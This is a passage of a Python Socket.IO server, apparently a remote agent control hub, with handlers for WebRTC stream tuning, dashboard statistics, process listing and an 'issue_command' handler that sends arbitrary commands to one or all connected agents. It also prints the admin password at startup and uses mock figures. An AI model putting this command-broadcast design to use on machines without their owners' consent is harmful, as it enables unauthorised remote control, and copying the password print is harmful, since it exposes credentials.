def handle_webrtc_frame_dropping(data):
    """Handle WebRTC frame dropping requests from load monitoring"""
    agent_id = data.get('agent_id')
    enabled = data.get('enabled')
    drop_ratio = data.get('drop_ratio', 0.3)
    priority = data.get('priority', 'keyframes_only')
    
    print(f"Frame dropping request for {agent_id}: enabled={enabled}, ratio={drop_ratio}, priority={priority}")
    
    # Forward frame dropping command to agent
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        emit('webrtc_frame_dropping', {
            'enabled': enabled,
            'drop_ratio': drop_ratio,
            'priority': priority
        }, room=agent_sid)
        print(f"Frame dropping command sent to agent {agent_id}")
    else:
        print(f"Agent {agent_id} not found for frame dropping")

@socketio.on('webrtc_get_enhanced_stats')
def handle_webrtc_get_enhanced_stats(data):
    """Get enhanced WebRTC statistics including performance metrics"""
    agent_id = data.get('agent_id')
    
    if not agent_id:
        emit('webrtc_enhanced_stats', {'error': 'Agent ID required'}, room=request.sid)
        return
    
    try:
        # Get basic stats
        basic_stats = get_webrtc_stats(agent_id)
        
        # Get bandwidth estimation
        bandwidth_stats = estimate_bandwidth(agent_id)
        
        # Get connection quality
        quality_data = monitor_connection_quality(agent_id)
        
        # Get production readiness assessment
        production_readiness = assess_production_readiness()
        
        enhanced_stats = {
            'agent_id': agent_id,
            'basic_stats': basic_stats,
            'bandwidth_stats': bandwidth_stats,
            'quality_data': quality_data,
            'production_readiness': production_readiness,
            'timestamp': datetime.datetime.now().isoformat()
        }
        
        emit('webrtc_enhanced_stats', enhanced_stats, room=request.sid)
        print(f"Enhanced stats sent for agent {agent_id}")
        
    except Exception as e:
        print(f"Error getting enhanced stats for {agent_id}: {e}")
        emit('webrtc_enhanced_stats', {'error': str(e)}, room=request.sid)

@socketio.on('webrtc_get_production_readiness')
def handle_webrtc_get_production_readiness():
    """Get production readiness assessment"""
    try:
        readiness_report = assess_production_readiness()
        emit('webrtc_production_readiness', readiness_report, room=request.sid)
        print("Production readiness report sent")
    except Exception as e:
        print(f"Error getting production readiness: {e}")
        emit('webrtc_production_readiness', {'error': str(e)}, room=request.sid)

@socketio.on('webrtc_get_migration_plan')
def handle_webrtc_get_migration_plan():
    """Get mediasoup migration plan"""
    try:
        migration_plan = generate_mediasoup_migration_plan()
        emit('webrtc_migration_plan', migration_plan, room=request.sid)
        print("Mediasoup migration plan sent")
    except Exception as e:
        print(f"Error getting migration plan: {e}")
        emit('webrtc_migration_plan', {'error': str(e)}, room=request.sid)

@socketio.on('webrtc_get_monitoring_data')
def handle_webrtc_get_monitoring_data():
    """Get comprehensive WebRTC monitoring data"""
    try:
        monitoring_data = enhanced_webrtc_monitoring()
        emit('webrtc_monitoring_data', monitoring_data, room=request.sid)
        print("Comprehensive monitoring data sent")
    except Exception as e:
        print(f"Error getting monitoring data: {e}")
        emit('webrtc_monitoring_data', {'error': str(e)}, room=request.sid)

@socketio.on('webrtc_adaptive_bitrate_control')
def handle_webrtc_adaptive_bitrate_control(data):
    """Manually trigger adaptive bitrate control"""
    agent_id = data.get('agent_id')
    current_quality = data.get('current_quality', 'auto')
    
    if not agent_id:
        emit('webrtc_adaptive_bitrate_result', {'error': 'Agent ID required'}, room=request.sid)
        return
    
    try:
        result = adaptive_bitrate_control(agent_id, current_quality)
        emit('webrtc_adaptive_bitrate_result', {
            'agent_id': agent_id,
            'result': result,
            'timestamp': datetime.datetime.now().isoformat()
        }, room=request.sid)
        print(f"Adaptive bitrate control result for {agent_id}: {result}")
    except Exception as e:
        print(f"Error in adaptive bitrate control for {agent_id}: {e}")
        emit('webrtc_adaptive_bitrate_result', {'error': str(e)}, room=request.sid)

@socketio.on('webrtc_implement_frame_dropping')
def handle_webrtc_implement_frame_dropping(data):
    """Manually trigger frame dropping implementation"""
    agent_id = data.get('agent_id')
    load_threshold = data.get('load_threshold', 0.8)
    
    if not agent_id:
        emit('webrtc_frame_dropping_result', {'error': 'Agent ID required'}, room=request.sid)
        return
    
    try:
        result = implement_frame_dropping(agent_id, load_threshold)
        emit('webrtc_frame_dropping_result', {
            'agent_id': agent_id,
            'result': result,
            'load_threshold': load_threshold,
            'timestamp': datetime.datetime.now().isoformat()
        }, room=request.sid)
        print(f"Frame dropping implementation result for {agent_id}: {result}")
    except Exception as e:
        print(f"Error implementing frame dropping for {agent_id}: {e}")
        emit('webrtc_frame_dropping_result', {'error': str(e)}, room=request.sid)

# Additional Socket.IO handlers for dashboard features
@socketio.on('get_agent_stats')
def handle_get_agent_stats():
    """Get agent statistics for dashboard"""
    try:
        # Calculate agent statistics
        total_agents = len(AGENTS_DATA)
        online_agents = sum(1 for agent in AGENTS_DATA.values() if agent.get('sid'))
        reports = total_agents * 3  # Mock calculation
        pass_rate = f"{int((online_agents / max(total_agents, 1)) * 100)}%" if total_agents > 0 else "0%"
        
        emit('agent_stats_response', {
            'reports': reports,
            'status': online_agents,
            'pass_rate': pass_rate,
            'trend': 'vs previous period'
        }, room=request.sid)
        
    except Exception as e:
        print(f"Error getting agent stats: {e}")
        emit('agent_stats_response', {'error': str(e)}, room=request.sid)

@socketio.on('get_system_health')
def handle_get_system_health():
    """Get system health information for dashboard"""
    try:
        uptime = datetime.datetime.now() - datetime.datetime.fromtimestamp(0)  # Mock uptime
        emit('system_health_response', {
            'controller_status': 'Active',
            'monitoring_period': 'Last 30 days',
            'uptime': f"{uptime.days}d {uptime.seconds//3600}h",
            'last_update': datetime.datetime.now().strftime('%H:%M:%S')
        }, room=request.sid)
        
    except Exception as e:
        print(f"Error getting system health: {e}")
        emit('system_health_response', {'error': str(e)}, room=request.sid)

@socketio.on('list_processes')
def handle_list_processes():
    """Get process list from agent"""
    try:
        # Forward request to agents
        emit('list_processes_request', {}, room='agents')
        emit('terminal_output', 'Requested process list from agents', room='operators')
        
    except Exception as e:
        print(f"Error requesting process list: {e}")
        emit('terminal_output', f'Error: {str(e)}', room='operators')

@socketio.on('refresh_dashboard')
def handle_refresh_dashboard():
    """Refresh dashboard data"""
    try:
        # Emit config status
        emit('config_status', {
            'admin_password_set': bool(Config.ADMIN_PASSWORD),
            'session_timeout': Config.SESSION_TIMEOUT,
            'blocked_ips': [ip for ip, (attempts, _) in LOGIN_ATTEMPTS.items() if attempts >= Config.MAX_LOGIN_ATTEMPTS]
        }, room='operators')
        
        # Emit agent list
        agent_list = []
        for agent_id, data in AGENTS_DATA.items():
            agent_list.append({
                'id': agent_id,
                'name': data.get('hostname', agent_id),
                'os': data.get('os', 'Unknown'),
                'online': bool(data.get('sid'))
            })
        
        emit('agent_list', agent_list, room='operators')
        emit('terminal_output', 'Dashboard refreshed', room='operators')
        
    except Exception as e:
        print(f"Error refreshing dashboard: {e}")
        emit('terminal_output', f'Error: {str(e)}', room='operators')

@socketio.on('issue_command')
def handle_issue_command(data):
    """Issue command to agent"""
    try:
        command = data.get('command')
        agent_id = data.get('agent_id')
        
        if not command:
            emit('terminal_output', 'Error: No command specified', room=request.sid)
            return
            
        if agent_id and agent_id in AGENTS_DATA:
            # Send to specific agent
            emit('execute_command', {'command': command}, room=AGENTS_DATA[agent_id]['sid'])
            emit('terminal_output', f'Command sent to {agent_id}: {command}', room=request.sid)
        else:
            # Send to all agents
            emit('execute_command', {'command': command}, room='agents')
            emit('terminal_output', f'Command sent to all agents: {command}', room=request.sid)
            
    except Exception as e:
        print(f"Error issuing command: {e}")
        emit('terminal_output', f'Error: {str(e)}', room=request.sid)

# WebRTC scaffolding code removed - not currently active

if __name__ == "__main__":
    print("Starting Neural Control Hub with Socket.IO + WebRTC support...")
    print(f"Admin password: {Config.ADMIN_PASSWORD}")
    print(f"Server will be available at: http://{Config.HOST}:{Config.PORT}")
    print(f"Session timeout: {Config.SESSION_TIMEOUT} seconds")
    print(f"Max login attempts: {Config.MAX_LOGIN_ATTEMPTS}")
    print(f"Password security: PBKDF2-SHA256 with {Config.HASH_ITERATIONS:,} iterations")
    print(f"Salt length: {Config.SALT_LENGTH} bytes")
    print(f"WebRTC support: {'Enabled' if WEBRTC_AVAILABLE else 'Disabled (aiortc not available)'}")
    if WEBRTC_AVAILABLE:
        print(f"WebRTC codecs: Video={', '.join(WEBRTC_CONFIG['codecs']['video'])}, Audio={', '.join(WEBRTC_CONFIG['codecs']['audio'])}")
        print(f"WebRTC features: Simulcast={WEBRTC_CONFIG['simulcast']}, SVC={WEBRTC_CONFIG['svc']}")
        print(f"Performance tuning: Bandwidth estimation, Adaptive bitrate, Frame dropping")
        print(f"Production scale: Current={PRODUCTION_SCALE['current_implementation']}, Target={PRODUCTION_SCALE['target_implementation']}")
        print(f"Scalability limits: aiortc={PRODUCTION_SCALE['scalability_limits']['aiorttc_max_viewers']}, mediasoup={PRODUCTION_SCALE['scalability_limits']['mediasoup_max_viewers']}")
    socketio.run(app, host=Config.HOST, port=Config.PORT, debug=False)